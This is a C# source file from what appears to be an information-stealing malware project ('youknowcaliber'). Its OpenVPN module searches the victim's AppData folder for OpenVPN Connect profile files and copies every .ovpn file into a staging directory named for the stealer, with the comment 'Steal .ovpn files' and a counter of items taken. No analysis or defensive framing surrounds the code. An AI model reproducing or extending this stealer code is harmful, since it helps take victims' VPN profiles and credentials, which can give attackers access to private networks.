using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace youknowcaliber
{
    class OpenVPN
    {
        // Save("OpenVPN");
        public static void Save()
        {
            string Stealer_Dir = Help.ExploitDir;
            // "OpenVPN connect" directory path
            string vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
            // Stop if not exists
            if (!Directory.Exists(vpn))
                return;
            try
            {
                // Create directory to save profiles
                Directory.CreateDirectory(Stealer_Dir + "\\VPN\\OpenVPN");
                // Steal .ovpn files
                foreach (string file in Directory.GetFiles(vpn))
                    if (Path.GetExtension(file).Contains("ovpn"))
                    {
                        File.Copy(file, Path.Combine(Stealer_Dir, "\\VPN\\OpenVPN" + Path.GetFileName(file)));
                    }
                Counting.OpenVPN++;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
